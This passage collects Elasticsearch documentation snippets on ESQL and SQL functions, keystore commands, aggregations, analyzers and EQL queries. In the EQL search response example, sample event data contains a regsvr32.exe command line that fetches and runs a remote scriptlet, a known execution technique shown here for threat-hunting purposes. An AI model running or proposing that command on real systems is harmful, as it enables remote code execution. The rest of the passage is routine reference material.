setting the CLI_JAVA_OPTS environment variable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/node-tool.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nexport CLI_JAVA_OPTS=\"-Xmx1g\"\nbin/elasticsearch-node ...\n```\n\n----------------------------------------\n\nTITLE: Geometric Functions in Elasticsearch SQL\nDESCRIPTION: A list of geometric functions supported in Elasticsearch SQL. These functions provide capabilities for working with spatial data, including geometry conversions, distance calculations, and coordinate extraction.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/qa/server/single-node/src/javaRestTest/resources/org/elasticsearch/xpack/sql/qa/single_node/ConsistentFunctionArgHandlingIT-non-tested-functions.txt#2025-04-21_snippet_3\n\nLANGUAGE: SQL\nCODE:\n```\nST_ASTEXT\nST_ASWKT\nST_DISTANCE\nST_GEOMETRYTYPE\nST_GEOMFROMTEXT\nST_WKTTOSQL\nST_X\nST_Y\nST_Z\n```\n\n----------------------------------------\n\nTITLE: Using CURTIME Function in Elasticsearch SQL\nDESCRIPTION: Example showing the CURTIME() function, which is an alias for CURRENT_TIME().\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_14\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CURTIME() AS result;\n\n         result\n------------------------\n12:31:27.237Z\n```\n\n----------------------------------------\n\nTITLE: Read SLM Privilege\nDESCRIPTION: Read-only access for Snapshot Lifecycle Management operations and ILM status (as of 8.15). Not available in serverless deployments\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_11\n\nLANGUAGE: markdown\nCODE:\n```\nread_slm\n```\n\n----------------------------------------\n\nTITLE: Service Token Output Format\nDESCRIPTION: Example output showing the bearer token format after token creation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/service-tokens-command.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nSERVICE_TOKEN elastic/fleet-server/my-token = AAEAAWVsYXN0aWM...vZmxlZXQtc2VydmVyL3Rva2VuMTo3TFdaSDZ\n```\n\n----------------------------------------\n\nTITLE: Japanese Search Mode Tokenization Example\nDESCRIPTION: Example output of kuromoji_tokenizer in search mode showing decompounding of long nouns with compound token synonyms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n関西, 関西国際空港, 国際, 空港\nアブラカダブラ\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Types for String Length Function in ESQL\nDESCRIPTION: A markdown table specifying the input string types (keyword and text) and the corresponding output type (integer) for a string length function in ESQL. This table is used for automated testing and documentation purposes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/length.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| string | result |\n| --- | --- |\n| keyword | integer |\n| text | integer |\n```\n\n----------------------------------------\n\nTITLE: Using Text Similarity Reranker with Cohere Rerank API\nDESCRIPTION: This example demonstrates how to use the text_similarity_reranker retriever with the Cohere Rerank API. It reranks documents matching a phrase query about landmarks in Paris, processing the top 100 results and applying a minimum score threshold of 0.5.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nGET /index/_search\n{\n   \"retriever\": {\n      \"text_similarity_reranker\": {\n         \"retriever\": {\n            \"standard\": {\n               \"query\": {\n                  \"match_phrase\": {\n                     \"text\": \"landmark in Paris\"\n                  }\n               }\n            }\n         },\n         \"field\": \"text\",\n         \"inference_id\": \"my-cohere-rerank-model\",\n         \"inference_text\": \"Most famous landmark in Paris\",\n         \"rank_window_size\": 100,\n         \"min_score\": 0.5\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Dropbox Refresh Token\nDESCRIPTION: cURL command to generate a refresh token using authorization code\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-dropbox.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncurl -X POST \"https://api.dropboxapi.com/oauth2/token?code=<AUTHORIZATION_CODE>&grant_type=authorization_code\" -u \"<APP_KEY>:<APP_SECRET>\"\n```\n\n----------------------------------------\n\nTITLE: Character Buffer Operation Restrictions\nDESCRIPTION: Identifies problematic character array operations that can be error-prone when working with buffers due to implicit offset handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-server-signatures.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\njava.lang.Character#codePointBefore(char[],int)\njava.lang.Character#codePointAt(char[],int)\n```\n\n----------------------------------------\n\nTITLE: Converting Various Types to Unsigned Long in ESQL\nDESCRIPTION: This snippet demonstrates the usage of TO_UNSIGNED_LONG function (and its aliases TO_ULONG and TO_UL) to convert string representations of numbers and invalid inputs to unsigned long values. It shows how the function handles integer strings, floating-point strings, and non-numeric strings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_unsigned_long.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW str1 = \"2147483648\", str2 = \"2147483648.2\", str3 = \"foo\"\n| EVAL long1 = TO_UNSIGNED_LONG(str1), long2 = TO_ULONG(str2), long3 = TO_UL(str3)\n```\n\n----------------------------------------\n\nTITLE: Calculating Exponential Value in ESQL\nDESCRIPTION: Demonstrates using the EXP function to calculate e raised to the power of a given number. The example creates a row with a double value 5.0 and calculates e^5.0 using the EXP function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/exp.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW d = 5.0\n| EVAL s = EXP(d)\n```\n\n----------------------------------------\n\nTITLE: Computing Arctangent using ATAN in ESQL\nDESCRIPTION: Demonstrates how to calculate the arctangent of a numeric value using the ATAN function. The function takes a numeric input and returns the angle in radians. In this example, it calculates the arctangent of 12.9.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/atan.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=12.9\n| EVAL atan=ATAN(a)\n```\n\n----------------------------------------\n\nTITLE: Nori Number Token Filter Analysis Results\nDESCRIPTION: This snippet shows the tokens produced by the nori_number filter. The Korean numbers '십만이천오백' and '３.２천' are normalized to '102500' and '3200' respectively, while preserving other tokens like '과'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-number.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"tokens\" : [{\n    \"token\" : \"102500\",\n    \"start_offset\" : 0,\n    \"end_offset\" : 6,\n    \"type\" : \"word\",\n    \"position\" : 0\n  }, {\n    \"token\" : \"과\",\n    \"start_offset\" : 6,\n    \"end_offset\" : 7,\n    \"type\" : \"word\",\n    \"position\" : 1\n  }, {\n    \"token\" : \"3200\",\n    \"start_offset\" : 8,\n    \"end_offset\" : 12,\n    \"type\" : \"word\",\n    \"position\" : 2\n  }]\n}\n```\n\n----------------------------------------\n\nTITLE: Using TRUNCATE/TRUNC Function in Elasticsearch SQL\nDESCRIPTION: Truncates a numeric expression to a specified number of decimal places without rounding. If the second parameter is negative, it truncates to places left of the decimal point.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_32\n\nLANGUAGE: sql\nCODE:\n```\nTRUNCATE(\n    numeric_exp      <1>\n    [, integer_exp]) <2>\n```\n\n----------------------------------------\n\nTITLE: Remove one or multiple settings from the Elasticsearch keystore\nDESCRIPTION: Deletes specified settings from the keystore, effective immediately upon command execution. Prompts for password if the keystore is protected.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/elasticsearch-keystore.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\nbin/elasticsearch-keystore remove the.setting.name.to.remove\n```\n\n----------------------------------------\n\nTITLE: Converting Various Types to Double in ESQL\nDESCRIPTION: This snippet demonstrates the usage of TO_DOUBLE function in ESQL. It shows how to convert a numeric string, a variable containing a numeric string, and an invalid string to double. The function handles different input types, including date conversions to milliseconds and boolean to numeric conversion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_double.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW str1 = \"5.20128E11\", str2 = \"foo\"\n| EVAL dbl = TO_DOUBLE(\"520128000000\"), dbl1 = TO_DOUBLE(str1), dbl2 = TO_DOUBLE(str2)\n```\n\n----------------------------------------\n\nTITLE: Creating Role Descriptor with Special Characters in Application Privileges for Elasticsearch\nDESCRIPTION: This role descriptor focuses on application privileges for 'maps', including special characters as privileges and resources, along with run-as permissions and metadata.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/security/audit/logfile/audited_roles.txt#2025-04-22_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\"cluster\":[],\"indices\":[],\"applications\":[{\"application\":\"maps\",\"privileges\":[\"{\",$\"}\",$\"\\n\",\"\\\\\",\"\\\"\"],\"resources\":[\"raster:*\"]},{\"application\":\"maps\",\"privileges\":[\"*:*\"],\"resources\":[\"noooooo!!\\n\\n\\f\\\\\\\\r\",\"{\"]}],\"run_as\":[\"jack\",\"nich*\",\"//\\\"\"],\"metadata\":{\"some meta\":42}}\n```\n\n----------------------------------------\n\nTITLE: Upgrade the Elasticsearch keystore format\nDESCRIPTION: Performs an upgrade of the keystore's internal format, ensuring compatibility with newer Elasticsearch versions. Must have write permissions to the keystore directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/elasticsearch-keystore.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\nbin/elasticsearch-keystore upgrade\n```\n\n----------------------------------------\n\nTITLE: Parent Aggregation Response Example\nDESCRIPTION: Shows the response from the parent aggregation query, displaying top answer owners and for each owner the top tags from their corresponding question documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-parent-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\n{\n  \"took\": 9,\n  \"timed_out\": false,\n  \"_shards\": {\n    \"total\": 1,\n    \"successful\": 1,\n    \"skipped\": 0,\n    \"failed\": 0\n  },\n  \"hits\": {\n    \"total\" : {\n      \"value\": 3,\n      \"relation\": \"eq\"\n    },\n    \"max_score\": null,\n    \"hits\": []\n  },\n  \"aggregations\": {\n    \"top-names\": {\n      \"doc_count_error_upper_bound\": 0,\n      \"sum_other_doc_count\": 0,\n      \"buckets\": [\n        {\n          \"key\": \"Sam\",\n          \"doc_count\": 1, <1>\n          \"to-questions\": {\n            \"doc_count\": 1, <2>\n            \"top-tags\": {\n              \"doc_count_error_upper_bound\": 0,\n              \"sum_other_doc_count\": 0,\n              \"buckets\": [\n                {\n                  \"key\": \"file-transfer\",\n                  \"doc_count\": 1\n                },\n                {\n                  \"key\": \"windows-server-2003\",\n                  \"doc_count\": 1\n                },\n                {\n                  \"key\": \"windows-server-2008\",\n                  \"doc_count\": 1\n                }\n              ]\n            }\n          }\n        },\n        {\n          \"key\": \"Troll\",\n          \"doc_count\": 1,\n          \"to-questions\": {\n            \"doc_count\": 1,\n            \"top-tags\": {\n              \"doc_count_error_upper_bound\": 0,\n              \"sum_other_doc_count\": 0,\n              \"buckets\": [\n                {\n                  \"key\": \"file-transfer\",\n                  \"doc_count\": 1\n                },\n                {\n                  \"key\": \"windows-server-2003\",\n                  \"doc_count\": 1\n                },\n                {\n                  \"key\": \"windows-server-2008\",\n                  \"doc_count\": 1\n                }\n              ]\n            }\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing Map with Non-Static Values in Painless\nDESCRIPTION: Illustrates the initialization of a Map using variables and expressions as keys and values in Painless, demonstrating type conversions and arithmetic operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_14\n\nLANGUAGE: painless\nCODE:\n```\nbyte b = 0;                  \nint i = 1;                   \nlong l = 2L;                 \nfloat f = 3.0F;              \ndouble d = 4.0;              \nString s = \"5\";              \nMap map = [b:i, l:f*d, d:s]; \n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Polish Stop Token Filter in Elasticsearch\nDESCRIPTION: This snippet shows how to use the _analyze API to test the custom analyzer with the polish_stop filter. It applies the analyzer to a Polish sentence to demonstrate stopword removal.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-polish-stop.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET polish_stop_example/_analyze\n{\n  \"analyzer\": \"analyzer_with_stop\",\n  \"text\": \"Gdzie kucharek sześć, tam nie ma co jeść.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using GREATEST Function in ESQL\nDESCRIPTION: Demonstrates using the GREATEST function to compare two integer values and return the larger one. The example creates a row with values a=10 and b=20, then uses GREATEST to find the maximum value between them.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/greatest.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = 10, b = 20\n| EVAL g = GREATEST(a, b)\n```\n\n----------------------------------------\n\nTITLE: Configuring TDigest Compression for MAD Calculation\nDESCRIPTION: Demonstrates how to adjust the compression parameter to control the trade-off between accuracy and memory usage in the median absolute deviation calculation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-median-absolute-deviation-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET reviews/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"review_variability\": {\n      \"median_absolute_deviation\": {\n        \"field\": \"rating\",\n        \"compression\": 100\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Mapping Configuration for Start and End Date Fields\nDESCRIPTION: JSON configuration for defining 'start' and 'end' date field mappings in Elasticsearch, which can be used to calculate time differences.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_21\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"mappings\": {\n    ...\n    \"properties\": {\n      ...\n      \"start\": {\n        \"type\": \"date\"\n      },\n      \"end\": {\n        \"type\": \"date\"\n      }\n      ...\n    }\n    ...\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: NAT Gateway and Network Load Balancer Metrics\nDESCRIPTION: Metric paths for AWS NAT Gateway and Network Load Balancer monitoring including connection counts, byte transfer statistics, packet counts, and TLS-related metrics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/test/framework/src/main/resources/org/elasticsearch/common/xcontent/support/many_filters.txt#2025-04-22_snippet_2\n\nLANGUAGE: plaintext\nCODE:\n```\naws.natgateway.metrics.ActiveConnectionCount.max\naws.natgateway.metrics.BytesInFromDestination.sum\naws.networkelb.metrics.ActiveFlowCount.avg\naws.networkelb.metrics.ActiveFlowCount_TCP.avg\naws.networkelb.metrics.ClientTLSNegotiationErrorCount.sum\n```\n\n----------------------------------------\n\nTITLE: Advanced EQL Sample Query with Size Parameters\nDESCRIPTION: Demonstrates how to configure sample size limits using max_samples_per_key and size parameters to control result set size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index*/_eql/search\n{\n  \"max_samples_per_key\": 2,\n  \"size\": 20,\n  \"query\": \"\"\"\n    sample\n      [any where uptime > 0]   by host,os\n      [any where port > 100]   by host,op_sys\n      [any where bool == true] by host,os\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Querying IPv6 Addresses Using Query String in Elasticsearch\nDESCRIPTION: This snippet shows how to use the query_string query to search for IPv6 addresses, demonstrating the need to escape colons by enclosing the address in quotes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/ip.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"query_string\" : {\n      \"query\": \"ip_addr:\\\"2001:db8::/48\\\"\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Multi Terms Aggregation in Elasticsearch\nDESCRIPTION: Example of using multi_terms aggregation to create buckets based on unique combinations of genre and product fields. This creates dynamic buckets for each unique pair of values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-multi-terms-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /products/_search\n{\n  \"aggs\": {\n    \"genres_and_products\": {\n      \"multi_terms\": {\n        \"terms\": [{\n          \"field\": \"genre\" <1>\n        }, {\n          \"field\": \"product\"\n        }]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Performing Cartesian-bounds Aggregation on Point Data\nDESCRIPTION: This snippet shows how to perform a cartesian-bounds aggregation on a Point field, filtering results with a query and returning the bounding box of matching documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cartesian-bounds-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"query\": {\n    \"match\": { \"name\": \"musée\" }\n  },\n  \"aggs\": {\n    \"viewport\": {\n      \"cartesian_bounds\": {\n        \"field\": \"location\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Describing Tangent Function in ESQL\nDESCRIPTION: This snippet provides a brief description of the tangent function, including a link to its mathematical definition. It is part of an automatically generated test case for ESQL's AbstractFunctionTestCase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/tan.md#2025-04-21_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns the [tangent](https://en.wikipedia.org/wiki/Sine_and_cosine) of an angle.\n```\n\n----------------------------------------\n\nTITLE: Combining Exact and Pattern Fields with Boosting\nDESCRIPTION: Example of combining specific field names with wildcard patterns, including field boosting. This searches content field and all name.* fields with name.* fields boosted by a factor of 5.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_17\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"query_string\" : {\n      \"fields\" : [\"content\", \"name.*^5\"],\n      \"query\" : \"this AND that OR thus\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Cartesian-bounds Aggregation Response for Point Data\nDESCRIPTION: This snippet shows the response format for a cartesian-bounds aggregation on Point data, including the top-left and bottom-right coordinates of the bounding box.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cartesian-bounds-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"aggregations\": {\n    \"viewport\": {\n      \"bounds\": {\n        \"top_left\": {\n          \"x\": 232.6999969482422,\n          \"y\": 4886.111328125\n        },\n        \"bottom_right\": {\n          \"x\": 233.63890075683594,\n          \"y\": 4886.0\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Listing all extensions for an account in Elasticsearch Service\nDESCRIPTION: API call to retrieve information about all extensions available in the account. Returns metadata about each extension without the actual file content.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_7\n\nLANGUAGE: sh\nCODE:\n```\ncurl -X GET \\\n  https://api.elastic-cloud.com/api/v1/deployments/extensions \\\n  -H 'Content-Type: application/json' \\\n  -H \"Authorization: ApiKey $CLOUD_API_KEY\" \\\n```\n\n----------------------------------------\n\nTITLE: Encoding Numeric to Aggregate Metric Double in ESQL\nDESCRIPTION: This snippet demonstrates how to use the TO_AGGREGATE_METRIC_DOUBLE function to convert a numeric value into an aggregate_metric_double type. The function takes a single numeric argument and returns the encoded aggregate metric double value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_aggregate_metric_double.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW x = 3892095203\n| EVAL agg_metric = TO_AGGREGATE_METRIC_DOUBLE(x)\n```\n\n----------------------------------------\n\nTITLE: EQL Search Response in Elasticsearch\nDESCRIPTION: This snippet shows the response format for an EQL search. It includes metadata about the search and the matching events in the 'hits' object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"is_partial\": false,\n  \"is_running\": false,\n  \"took\": 60,\n  \"timed_out\": false,\n  \"hits\": {\n    \"total\": {\n      \"value\": 2,\n      \"relation\": \"eq\"\n    },\n    \"events\": [\n      {\n        \"_index\": \".ds-my-data-stream-2099.12.07-000001\",\n        \"_id\": \"OQmfCaduce8zoHT93o4H\",\n        \"_source\": {\n          \"@timestamp\": \"2099-12-07T11:07:09.000Z\",\n          \"event\": {\n            \"category\": \"process\",\n            \"id\": \"aR3NWVOs\",\n            \"sequence\": 4\n          },\n          \"process\": {\n            \"pid\": 2012,\n            \"name\": \"regsvr32.exe\",\n            \"command_line\": \"regsvr32.exe  /s /u /i:https://...RegSvr32.sct scrobj.dll\",\n            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n          }\n        }\n      },\n      {\n        \"_index\": \".ds-my-data-stream-2099.12.07-000001\",\n        \"_id\": \"xLkCaj4EujzdNSxfYLbO\",\n        \"_source\": {\n          \"@timestamp\": \"2099-12-07T11:07:10.000Z\",\n          \"event\": {\n            \"category\": \"process\",\n            \"id\": \"GTSmSqgz0U\",\n            \"sequence\": 6,\n            \"type\": \"termination\"\n          },\n          \"process\": {\n            \"pid\": 2012,\n            \"name\": \"regsvr32.exe\",\n            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n          }\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL KEEP Column Selection Query\nDESCRIPTION: Demonstrates using the KEEP function in ESQL to select specific columns from the employees table. Uses wildcard patterns with asterisks to match column names starting with 'first_name' and explicitly keeps the last_name column.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/keepWildcardPrecedence.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name*, last_name, first_na*\n```\n\n----------------------------------------\n\nTITLE: Example of ABS Function Usage\nDESCRIPTION: Demonstrates how to use the ABS function with different numeric values, showing that it returns the absolute value regardless of whether the input is positive or negative.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ABS(-123.5), ABS(55);\n\n  ABS(-123.5)  |    ABS(55)\n---------------+---------------\n123.5          |55\n```\n\n----------------------------------------\n\nTITLE: API Key Object Schema for Security Config Change Events in Elasticsearch\nDESCRIPTION: Defines the structure of an API key object in security configuration change events. It includes fields for the key's ID, name, expiration, role descriptors, and metadata.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_26\n\nLANGUAGE: javascript\nCODE:\n```\n{\"id\": <string>, \"name\": <string>, \"expiration\": <string>, \"role_descriptors\": [<object>],\n\"metadata\": [<object>]}\n```\n\n----------------------------------------\n\nTITLE: Storing Task Results in Java\nDESCRIPTION: This snippet shows how to check if a task's results should be stored and use a TaskResultStoringActionListener to persist the results. It's used in TransportActions to handle result storage.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/internal/DistributedArchitectureGuide.md#2025-04-21_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nif (request.getShouldStoreResult()) {\n    listener = new TaskResultStoringActionListener(taskManager, task, listener);\n}\n```\n\n----------------------------------------\n\nTITLE: Sample Document with Nested Objects\nDESCRIPTION: Example document containing a products field with nested object properties to be processed by the Foreach processor.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/foreach-processor.md#2025-04-21_snippet_6\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"products\" : {\n    \"widgets\" : {\n      \"total_sales\" : 50,\n      \"unit_price\": 1.99,\n      \"display_name\": \"\"\n    },\n    \"sprockets\" : {\n      \"total_sales\" : 100,\n      \"unit_price\": 9.99,\n      \"display_name\": \"Super Sprockets\"\n    },\n    \"whizbangs\" : {\n      \"total_sales\" : 200,\n      \"unit_price\": 19.99,\n      \"display_name\": \"Wonderful Whizbangs\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Uppercase Processor in Elasticsearch\nDESCRIPTION: Example configuration for the Uppercase processor that converts the 'foo' field value to uppercase. The processor can be configured with various options including target field, error handling, and conditional execution.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/uppercase-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"uppercase\": {\n    \"field\": \"foo\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Missing Field Mapping in Elasticsearch\nDESCRIPTION: This snippet shows how to manually add a missing 'job_type' field mapping to resolve sync job failures after upgrading from versions earlier than 8.9.0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-known-issues.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT .elastic-connectors-sync-jobs-v1/_mapping\n{\n  \"properties\": {\n    \"job_type\": {\n      \"type\": \"keyword\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Documents in Nested Index\nDESCRIPTION: This snippet describes how to index documents into a nested Elasticsearch index, with the example of adding 'drivers' with nested 'vehicle' information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-nested-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /drivers/_doc/1\n{\n  \"driver\" : {\n        \"last_name\" : \"McQueen\",\n        \"vehicle\" : [\n            {\n                \"make\" : \"Powell Motors\",\n                \"model\" : \"Canyonero\"\n            },\n            {\n                \"make\" : \"Miller-Meteor\",\n                \"model\" : \"Ecto-1\"\n            }\n        ]\n    }\n}\n```\n\nLANGUAGE: console\nCODE:\n```\nPUT /drivers/_doc/2?refresh\n{\n  \"driver\" : {\n        \"last_name\" : \"Hudson\",\n        \"vehicle\" : [\n            {\n                \"make\" : \"Mifune\",\n                \"model\" : \"Mach Five\"\n            },\n            {\n                \"make\" : \"Miller-Meteor\",\n                \"model\" : \"Ecto-1\"\n            }\n        ]\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Internal Representation of Flattened Objects\nDESCRIPTION: Shows how Elasticsearch internally flattens object hierarchies into a simple list of field names and values, losing the association between fields in the same object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/nested.md#2025-04-21_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"group\" :        \"fans\",\n  \"user.first\" : [ \"alice\", \"john\" ],\n  \"user.last\" :  [ \"smith\", \"white\" ]\n}\n```\n\n----------------------------------------\n\nTITLE: Setting SMB MMAP File System for a Specific Index in Elasticsearch\nDESCRIPTION: Configures a single index to use the SMB MMAP file system storage type during index creation. This applies the SMB-optimized storage configuration to just the specified index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/store-smb-usage.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n   \"settings\": {\n       \"index.store.type\": \"smb_mmap_fs\"\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: TO_GEOPOINT Function Header\nDESCRIPTION: Header section of the TO_GEOPOINT function documentation, indicating it is auto-generated and includes various documentation sections through markdown includes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_geopoint.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `TO_GEOPOINT` [esql-to_geopoint]\n\n**Syntax**\n\n:::{image} ../../../images/functions/to_geopoint.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/to_geopoint.md\n:::\n\n:::{include} ../description/to_geopoint.md\n:::\n\n:::{include} ../types/to_geopoint.md\n:::\n\n:::{include} 